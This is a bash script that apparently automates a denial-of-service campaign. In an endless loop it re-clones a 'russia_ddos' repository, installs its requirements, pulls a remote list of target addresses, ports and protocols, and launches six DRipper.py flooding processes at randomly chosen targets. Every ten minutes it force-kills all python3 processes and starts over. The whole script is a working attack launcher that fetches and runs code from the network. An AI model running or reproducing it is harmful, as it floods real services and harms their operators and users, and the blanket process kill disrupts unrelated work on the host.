#!/bin/bash
#systemctl start docker

while true
do

pkill -9 python3
cd ~
rm -rf russia_ddos
git clone https://github.com/alexmon1989/russia_ddos.git
cd russia_ddos
pip install -r requirements.txt

for i in $(seq 1 6)
do
        site=$(curl https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper | cat | shuf -n 1)
        addr=$(echo $site | awk '{print $1}')
        port=$(echo $site | awk '{print $2}')
        prot=$(echo $site | awk '{print $3}')
        echo $addr $port $prot
        python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
#        docker run -t --rm alexmon1989/dripper:latest -l 2048 -s $addr -m $prot -p $port -t 50&
done
sleep 600
#pkill -9 docker
pkill -9 python3
done
